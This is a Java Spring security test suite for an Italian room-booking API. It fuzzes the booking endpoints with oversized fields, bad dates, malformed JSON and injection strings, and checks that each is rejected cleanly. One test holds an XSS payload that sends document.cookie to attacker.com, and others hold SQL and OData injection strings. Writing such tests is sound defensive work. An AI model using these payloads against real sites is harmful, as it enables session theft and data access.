package it.szn.prenotazionesale.appsec;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.microsoft.graph.serviceclient.GraphServiceClient;
import it.szn.prenotazionesale.model.PrenotazioneRequestDTO;
import it.szn.prenotazionesale.model.SalaDTO;
import it.szn.prenotazionesale.service.SaleService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors;
import org.springframework.security.test.web.servlet.setup.SecurityMockMvcConfigurers;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import java.time.LocalDate;
import java.util.List;

import static org.mockito.Mockito.when;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.jwt;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Suite di Test di Sicurezza Applicativa (OWASP AppSec):
 * Payload Fuzzing, Boundary Conditions & Input Validation Hardening.
 *
 * Invia payload estremi, malformati, sovradimensionati o con injection verso gli endpoint di prenotazione
 * per verificare che il backend risponda SEMPRE con HTTP 400 Bad Request controllato (o altro codice client error)
 * e MAI con eccezioni non gestite HTTP 500 Internal Server Error (OWASP A04:2021 Insecure Design,
 * A05:2021 Security Misconfiguration & CWE-20 Improper Input Validation).
 */
@SpringBootTest
class PayloadFuzzingAndBoundaryAppSecTest {

    @Autowired
    private WebApplicationContext context;

    private MockMvc mockMvc;

    private final ObjectMapper objectMapper = new ObjectMapper();

    @MockitoBean
    private SaleService saleService;

    @MockitoBean
    private GraphServiceClient graphClient;

    @BeforeEach
    void setUp() {
        mockMvc = MockMvcBuilders
                .webAppContextSetup(context)
                .apply(SecurityMockMvcConfigurers.springSecurity())
                .build();

        when(saleService.getSale()).thenReturn(List.of(
                SalaDTO.builder().id("sala1@szn.it").nome("Sala Dohrn").email("sala1@szn.it").build(),
                SalaDTO.builder().id("sala2@szn.it").nome("Sala Fermi").email("sala2@szn.it").build()
        ));
    }

    private SecurityMockMvcRequestPostProcessors.JwtRequestPostProcessor adminJwt() {
        return jwt()
                .authorities(new SimpleGrantedAuthority("ROLE_RoomBooking.Admin"))
                .jwt(j -> j.claim("roles", List.of("RoomBooking.Admin"))
                        .claim("oid", "admin-oid-001")
                        .claim("preferred_username", "admin@szn.it"));
    }

    @Nested
    @DisplayName("1. Fuzzing con Stringhe Sovradimensionate e Payload Massivi (Protezione DoS / Resource Exhaustion)")
    class OversizedPayloadFuzzingTests {

        @Test
        @DisplayName("FUZZ-01: Titolo sovradimensionato (> 255 caratteri, es. 10.000 caratteri) - rifiutato con 400 Bad Request")
        void testOversizedTitle_ReturnsBadRequest400() throws Exception {
            String massiveTitle = "A".repeat(10_000);

            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo(massiveTitle)
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400))
                    .andExpect(jsonPath("$.message").exists());
        }

        @Test
        @DisplayName("FUZZ-02: Descrizione sovradimensionata (> 4000 caratteri, es. 50.000 caratteri) - rifiutata con 400 Bad Request")
        void testOversizedDescription_ReturnsBadRequest400() throws Exception {
            String massiveDescription = "B".repeat(50_000);

            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Meeting Test")
                    .descrizione(massiveDescription)
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("FUZZ-03: Payload JSON estremo da 1MB (Resource Exhaustion / DoS) - controllato con 400 Bad Request e mai 500")
        void testExtremePayload1MB_ReturnsBadRequest400_Never500() throws Exception {
            String massiveContent = "X".repeat(1_000_000); // 1 MB di caratteri

            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Meeting DoS Test")
                    .descrizione(massiveContent)
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }
    }

    @Nested
    @DisplayName("2. Test di Limite (Boundary Conditions) su Date e Orari")
    class DateBoundaryTests {

        @Test
        @DisplayName("BOUND-01: Date invertite (data inizio successiva alla data fine) - rifiutata con 400 Bad Request")
        void testInvertedDates_StartAfterEnd_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Meeting Date Invertite")
                    .start("2026-11-25T15:00:00")
                    .end("2026-11-25T10:00:00") // Inizio dopo fine
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("BOUND-02: Date identiche (durata zero millisecondi) - rifiutata con 400 Bad Request")
        void testEqualDates_ZeroDuration_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Meeting Durata Zero")
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T10:00:00") // Inizio coincide con fine
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("BOUND-03: Ricorrenza con data fine serie antecedente alla data inizio - rifiutata con 400 Bad Request")
        void testInvertedRecurringDates_DataFineBeforeStart_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Serie con dataFine nel passato")
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .pattern("daily")
                    .intervallo(1)
                    .dataFine("2026-11-20") // dataFine precedente a start
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("BOUND-04: Data nel passato (tentativo di prenotazione retroattiva) - verifica convalida 400 Bad Request")
        void testPastDates_BookingInThePast_ReturnsBadRequest400() throws Exception {
            // Regola di business / boundary condition: le prenotazioni retroattive non devono essere accettate
            String dataPassataInizio = LocalDate.now().minusYears(2) + "T09:00:00";
            String dataPassataFine = LocalDate.now().minusYears(2) + "T10:00:00";

            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Meeting nel Passato")
                    .start(dataPassataInizio)
                    .end(dataPassataFine)
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest());
        }

        @Test
        @DisplayName("BOUND-05: Serie ricorrente che eccede la durata massima di 365 giorni - rifiutata con 400 Bad Request")
        void testRecurrenceExceedingMaxOneYear_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Serie Infinita 10 Anni")
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .pattern("daily")
                    .intervallo(1)
                    .dataFine("2036-11-25") // 10 anni nel futuro
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }
    }

    @Nested
    @DisplayName("3. Validazione Campi Obbligatori Nulli, Vuoti o Tipi Errati")
    class FieldValidationAndTypeTests {

        @Test
        @DisplayName("VAL-01: Campo obbligatorio 'salaEmail' nullo - rifiutato con 400 Bad Request")
        void testNullSalaEmail_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail(null)
                    .titolo("Meeting")
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("VAL-02: Campo obbligatorio 'titolo' vuoto o blank - rifiutato con 400 Bad Request")
        void testBlankTitolo_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("   ")
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("VAL-03: Campi 'start' ed 'end' nulli - rifiutati con 400 Bad Request")
        void testNullStartAndEnd_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Meeting")
                    .start(null)
                    .end(null)
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("VAL-04: Tipo errato su campo numerico 'intervallo' (stringa anziché intero) - deve restituire 400 Bad Request e MAI 500")
        void testInvalidFieldType_IntervalloString_ExpectsBadRequest400() throws Exception {
            // Payload con tipo incompatibile per Jackson: "intervallo" valorizzato a stringa alfabetica
            String malformedTypeJson = """
                    {
                      "salaEmail": "sala1@szn.it",
                      "titolo": "Meeting Type Mismatch",
                      "start": "2026-11-25T10:00:00",
                      "end": "2026-11-25T11:00:00",
                      "pattern": "daily",
                      "intervallo": "NOT_AN_INTEGER_NUMBER",
                      "dataFine": "2026-11-30"
                    }
                    """;

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(malformedTypeJson))
                    .andExpect(status().isBadRequest());
        }

        @Test
        @DisplayName("VAL-05: JSON sintatticamente malformato (parentesi troncata) - deve restituire 400 Bad Request e MAI 500")
        void testMalformedJsonSyntax_ExpectsBadRequest400() throws Exception {
            String brokenJson = """
                    {
                      "salaEmail": "sala1@szn.it",
                      "titolo": "Malformed JSON
                    """;

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(brokenJson))
                    .andExpect(status().isBadRequest());
        }

        @Test
        @DisplayName("VAL-06: Valore 'intervallo' fuori dai limiti ammessi (es. -5 o 999) - rifiutato con 400 Bad Request")
        void testIntervalOutOfRange_ReturnsBadRequest400() throws Exception {
            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo("Meeting Intervallo Errato")
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .pattern("daily")
                    .intervallo(999) // Max ammesso: 52
                    .dataFine("2026-11-30")
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }
    }

    @Nested
    @DisplayName("4. Fuzzing con Injection: XSS, SQL & OData Injection")
    class InjectionPayloadFuzzingTests {

        @Test
        @DisplayName("INJ-01: Tag XSS nel titolo e nella descrizione - gestiti senza errori 500 non gestiti")
        void testXssInTitleAndDescription_HandledGracefullyWithout500() throws Exception {
            String xssScript = "<script>alert('XSS-TEST')</script>";
            String xssImg = "<img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">";

            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail("sala1@szn.it")
                    .titolo(xssScript)
                    .descrizione(xssImg)
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .build();

            // Il backend non deve collassare con HTTP 500 a causa di script o tag HTML
            int responseStatus = mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andReturn().getResponse().getStatus();

            org.junit.jupiter.api.Assertions.assertNotEquals(500, responseStatus,
                    "Il backend ha restituito un errore 500 non gestito su payload XSS!");
        }

        @Test
        @DisplayName("INJ-02: SQL Injection nel parametro salaEmail - rifiutata con 400 Bad Request, mai 500")
        void testSqlInjectionInSalaEmail_ReturnsBadRequest400() throws Exception {
            String sqlInjectionEmail = "' OR '1'='1' --@szn.it";

            PrenotazioneRequestDTO request = PrenotazioneRequestDTO.builder()
                    .salaEmail(sqlInjectionEmail)
                    .titolo("Meeting SQL Injection Test")
                    .start("2026-11-25T10:00:00")
                    .end("2026-11-25T11:00:00")
                    .build();

            mockMvc.perform(post("/api/prenotazioni")
                            .with(adminJwt())
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(objectMapper.writeValueAsString(request)))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400));
        }

        @Test
        @DisplayName("INJ-03: OData Injection nei parametri temporali di filtro (GET) - rifiutata con 400 Bad Request")
        void testODataInjectionInQueryFilter_ReturnsBadRequest400() throws Exception {
            String oDataInjectionParam = "2026-11-25' or 1=1 or 'a'='a";

            mockMvc.perform(get("/api/prenotazioni")
                            .with(adminJwt())
                            .param("salaEmail", "sala1@szn.it")
                            .param("dataInizio", oDataInjectionParam)
                            .param("dataFine", "2026-11-25T18:00:00"))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.status").value(400))
                    .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString("ISO-8601")));
        }
    }
}
